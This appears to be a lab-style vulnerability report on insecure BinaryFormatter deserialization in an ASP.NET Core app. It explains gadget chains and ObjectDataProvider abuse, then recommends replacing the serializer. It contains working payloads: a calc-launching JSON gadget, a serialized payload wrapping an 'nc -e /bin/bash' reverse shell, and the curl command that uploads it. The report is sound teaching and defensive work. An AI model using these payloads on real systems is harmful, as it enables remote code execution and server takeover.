# Insecure Deserialization Vulnerability Leading to Remote Code Execution

## Summary

This report examines a critical vulnerability identified in an ASP.NET Core application related to the misuse of the `BinaryFormatter` class during deserialization. The application accepts serialized metadata for files and updates this metadata using an external package, leading to potential remote code execution (RCE) attacks.

## Vulnerability Details

### Application Functionality

- **Serialized Metadata Handling:** The application accepts serialized metadata for files.
- **Metadata Update:** Utilizes an external package to update the metadata of created files.

### Key Considerations

- **Deserialization Process:** Methodology used to deserialize incoming data.
- **External Package Usage:** External package responsible for updating file metadata.

### Deserialization Process

#### Use of `BinaryFormatter`

- **Obsolescence:**  
  The application employs the `BinaryFormatter` class, which is [obsolete](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) and unsupported in .NET 9.0.
  
- **Security Implications:**  
  `BinaryFormatter` is inherently insecure, allowing for the execution of arbitrary code and denial-of-service (DoS) attacks during deserialization, which makes it a prime target for exploitation.

### Exploitation via Gadget Chains

- **Gadget Chains:**  
  A "gadget" is a snippet of code within an application that can be exploited to achieve specific malicious goals. Individually, gadgets may not perform harmful actions with user input. However, an attacker can invoke a method that passes their input into another gadget. By chaining multiple gadgets together, an attacker can funnel their input into a dangerous "sink gadget," resulting in significant damage.

- **Inherent Flaws:**  
  The design of `BinaryFormatter` contains security vulnerabilities that **cannot be fully mitigated** through additional measures.

- **Exploitation Tools:**  
  Attackers typically use tools like [ysoserial.net](https://github.com/pwntester/ysoserial.net) to craft malicious payloads.

- **Unrestricted `$type` Acceptance:**  
  The deserialization process accepts unintended `$type` data, enabling attackers to specify malicious types.
  
  - **Example Payload:**
    ```json
    {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": ["cmd.exe", "/c calc.exe"]
        },
        "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
    }
    ```

- **ObjectDataProvider Abuse:**  
  While primarily used for data binding in WPF applications, [ObjectDataProvider](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=windowsdesktop-8.0) can invoke methods that execute arbitrary code or run processes when misused during deserialization.
  
  ##### Why Use `ObjectDataProvider`?
  
  Directly invoking the `Process` class to launch new processes isn't feasible because the server expects data, not code execution instructions. This restricts attackers to setting properties without calling functions directly.
  
  The `ObjectDataProvider` class, intended for [data binding](https://learn.microsoft.com/en-us/dotnet/desktop/wpf/data/?view=netdesktop-9.0) in WPF, offers a workaround. It can be configured to automatically call specified functions when certain properties are set. This capability allows attackers to indirectly trigger method executions by setting properties through JSON data.
  
  For example, during deserialization, the server creates an `ObjectDataProvider` instance and sets properties like `MethodName`, `MethodParameters`, and `ObjectInstance`. This setup can inadvertently invoke the `Process.Start` method, launching processes without explicit function calls and enabling remote code execution.

- **Necessity for Custom Gadgets:**  
  Given that `ObjectDataProvider` is specific to WPF and no existing gadgets are available for ASP.NET Core as the author of `ysoserial.net` has mentioned [here](https://github.com/pwntester/ysoserial.net/issues/25), a custom malicious gadget was developed. This custom gadget leverages the `ISerializable` interface to control the deserialization process and execute arbitrary code, effectively exploiting the deserialization flaw in the ASP.NET Core application.


### Exploitation via Gadget Chains in ASP.NET Core

#### Simulating a Malicious Gadget

A custom gadget was developed using the [ISerializable interface](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=net-9.0) to control the serialization and deserialization processes. This gadget enables the execution of arbitrary code (e.g., launching a reverse shell) during object deserialization.

- **Mechanism:**
  - **Serialization Control:** Defines custom logic to manipulate deserialization.
  - **Code Execution:** Executes arbitrary code during object deserialization.

- **Deployment:**  
  Packaged as a malicious external package. When integrated into the `WriteFileMetadata` functionality, it renders the application vulnerable to RCE attacks.

#### Attack Execution

1. **Payload Generation:**  
   Attacker crafts a malicious payload using the custom package.

2. **Deserialization Process:**
   - **Execution Trigger:** During deserialization, the payload manipulates the process to execute arbitrary code before object creation, resulting in a `500` Internal Server Error.
   - **Reverse Shell Deployment:** Establishes a reverse shell connection, providing persistent server access for further unauthorized actions such as data exfiltration or privilege escalation.

## Proof of Concept

### Malicious Package

A malicious package was created containing the [`ProcessWrapper`](../../../Packages/MaliciousMetadataWriter/MaliciousMetadataWriter.cs) class. This class implements the `ISerializable` interface, enabling the execution of arbitrary code during the deserialization process.

### Payload Generator

The [payload generator](PoC/PayloadGenerator.cs) generates serialized malicious metadata using the `ProcessWrapper` class. The payload is created with the following command:

```bash
dotnet run nc 127.0.0.1 4432 -e /bin/bash
```

### Uploading the Payload
The serialized malicious metadata is uploaded to the vulnerable API endpoint using the following curl command:

```bash
curl -X 'POST' \
  'https://localhost:7037/api/AssignMetadataToFile?fileId=1&serializedMetadata=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAMAgAAAE5NYWxpY2lvdXNNZXRhZGF0YVdyaXRlciwgVmVyc2lvbj0xLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAACZNYWxpY2lvdXNNZXRhZGF0YVdyaXRlci5Qcm9jZXNzV3JhcHBlcgIAAAAIRmlsZU5hbWUJQXJndW1lbnRzAQECAAAABgMAAAACbmMGBAAAABsxMjcuMC4wLjEgNDQzMiAtZSAvYmluL2Jhc2gL' \
  -H 'accept: text/plain' \
  -d ''
```

### Reverse shell
By establishing a listener on port `4432`, the attacker gains remote shell access to the compromised server.

## Mitigation Strategies

### Deprecate `BinaryFormatter`

Implementing this measure is essential to fully eliminate the vulnerabilities introduced by `BinaryFormatter`, ensuring the application's resilience against deserialization-based attacks and preventing unauthorized code execution and system compromise. Also, check this [link](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/) for further information on the migration guide.

- **Action:**  
  Remove the usage of `BinaryFormatter` from the application and replace it with secure serialization alternatives such as `System.Text.Json` or `DataContractSerializer`.

- **Benefits:**  
  Enhanced security by preventing deserialization of untrusted data, strict type handling, and improved input validation.

- **Additional Measures:**  
  While implementing a `SerializationBinder` can restrict deserialization to specific, trusted types, it does not fully address the inherent security vulnerabilities of `BinaryFormatter`. The only comprehensive solution is to adopt secure serialization libraries as recommended.

- **Recommended Alternatives:**
  - [`System.Text.Json`](https://learn.microsoft.com/en-us/dotnet/api/system.text.json)
  - [`DataContractSerializer`](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer)

**Note:** Transitioning to these alternatives not only mitigates the security risks associated with `BinaryFormatter` but also aligns with modern serialization practices supported by the .NET ecosystem.

## Conclusion

The identified vulnerability arises from the improper use of the obsolete `BinaryFormatter` class, which lacks secure deserialization mechanisms. The absence of suitable gadgets for ASP.NET Core necessitates the creation of custom malicious gadgets to exploit the flaw effectively. Specifically, misuse of the `ObjectDataProvider` class allows attackers to execute arbitrary code by chaining gadgets that execute system processes.

**Mitigation Measures:**

- Replace `BinaryFormatter` with secure serialization alternatives.

Implementing this measure will significantly enhance the application's security posture, safeguarding against deserialization-based attacks and preventing unauthorized code execution and system compromise.

## References

[.NET Deserialization Exploits Explained](https://vbscrub.com/2020/02/05/net-deserialization-exploits-explained/)

